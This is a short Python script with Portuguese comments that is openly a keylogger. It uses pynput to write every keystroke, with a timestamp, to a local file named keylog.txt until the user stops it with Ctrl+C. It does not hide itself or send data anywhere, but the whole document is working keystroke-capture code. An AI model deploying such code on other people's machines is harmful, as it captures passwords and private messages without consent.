 from pynput.keyboard import Listener

import logging


# Configuração de Logs

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylog.txt"), 

                    level=logging.DEBUG, 

                    format='%(asctime)s: %(message)s')


def on_press(key):

    # Registra a tecla pressionada no arquivo de log

    logging.info(str(key))


print("Keylogger iniciado. Pressione Ctrl+C para parar.")


# Inicia o Listener do teclado

with Listener(on_press=on_press) as listener:

    listener.join() 
